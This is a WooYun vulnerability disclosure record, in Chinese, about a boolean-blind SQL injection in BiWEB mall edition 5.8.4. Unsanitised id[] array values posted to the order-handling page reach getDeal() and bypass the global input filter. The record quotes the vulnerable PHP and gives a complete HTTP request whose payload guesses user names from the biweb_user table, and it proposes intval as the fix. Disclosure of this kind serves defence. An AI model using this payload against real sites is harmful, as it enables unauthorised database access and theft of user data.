{"id": 43582, "wybug_id": "wooyun-2014-082321", "wybug_title": "BiWEB最新商城版注入一枚（无视全局过滤）", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-11-10 10:05", "wybug_open_date": "2015-02-08 10:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新商城版注入一枚（无视全局过滤） 详细说明：  看wooyun上看到了有人提了BiWEB的一个XSS漏洞： WooYun: BIWEB商城版XSS盲打cookie ，我来找找其他的漏洞吧。去官网下BiWEB商城版最新的5.8.4来看看。在用户操作订单的时候有个SQL注入漏洞，error-based blind 失败，bool-based blind成功，下面是分析产生过程及注入证明。BiWEB首先对GET和POST进行了过滤，/config/filtrate.inc.php\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\n这里就先不说这种过滤的脑残之处了。继续往下看，处理用户订单的文件/deal/adminu/my_deal.php（测试时记得要先注册一个用户并登录）。\n无关代码if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\"){\t\t//id[]处理\t\t$strId=implode(\",\",$_POST[\"id\"]);\t\t\t\t$strId=\"(\".$strId.\")\";\t\t\t\t\tif($_POST['id'] == ''){\t\t\t\t\t\tcheck::Alert('请选择订单',-1);\t\t}\t\t\t$arrInfo = $objWebInit->getDeal($strId);\t\t\t\t\t\tif($arrInfo['state'] ==6){\t\t\tcheck::Alert('该订单已经完成，不能再操作',-1);\t\t}\t\tif($_POST['del'] !=''){\t\t\tif($arrInfo['type_id'] == 1){//当订单状态为：新订单,待确认 ,可以取消\t\t\t\tif($objWebInit->deleteDeal($strId)){\t\t\t\t\tcheck::Alert('取消订单成功',-1);\t\t\t\t} else {\t\t\t\t\tcheck::Alert('取消订单失败',-1);\t\t\t\t}\t\t\t}else{\t\t\t\tcheck::Alert('您无法取消订单，请跟商家联系！',-1);\t\t\t}\t\t}else{\t\t\tif($arrInfo['type_id'] != 5){//当订单状态为：新订单,待确认 ,可以取消\t\t\t\tif($objWebInit->SuccessDeal($strId)){\t\t\t\t\tcheck::Alert('交易成功',-1);\t\t\t\t} else {\t\t\t\t\tcheck::Alert('交易失败',-1);\t\t\t\t}\t\t\t}else{\t\t\t\tcheck::Alert('此订单已经交易成功！',-1);\t\t\t}\t\t\t\t\t}}无关代码\n这是操作订单的代码，就是取消订单，可以看到，需要POST一个数组，但是POST的数据是数字型的，也就可以绕过全局过滤了。再看看后面有没有对这里POST的值进行过滤，上面代码执行了$arrInfo = $objWebInit->getDeal($strId);，去看看getDeal()。\nfunction getDeal($id,$pass=null){\t\tif($pass!=null) $where= \" and pass='$pass'\";\t\telse $where=\"\";\t\t$strSQL = \"SELECT * FROM $this->tablename2 \".\t\t\" Where id in \".$id.$where;\t\t\t\t$rs = $this->db->query($strSQL);\t\t\t\treturn $rs->fetch();\n到这里问题就来了，直接执行SQL了。登录，抓包，修改，增加payload。Payload:\nPOST /deal/adminu/my_deal.php HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Referer: http://192.168.0.107/deal/adminu/my_deal.phpAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 192.168.0.107Content-Length: 147Proxy-Connection: Keep-AlivePragma: no-cacheCookie: AJSTAT_ok_times=1; PHPSESSID=dg65p98c6jmaasrkc1vld9avt1user_name=XXXXX&del=%E5%8F%96%E6%B6%88%E8%AE%A2%E5%8D%95&id[]=1&id[]=1) and mid((select user_name from biweb_user limit 0,1),1,1)='a' and (1)=(1\n因为是bool-based blind，所以当猜测正确时，是这样的\n\nSQL执行情况\n\n如果猜测不对\n\n手工只是为了证明存在漏洞，利用时，可以写脚本，可以用工具，否则手工会累死人。   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}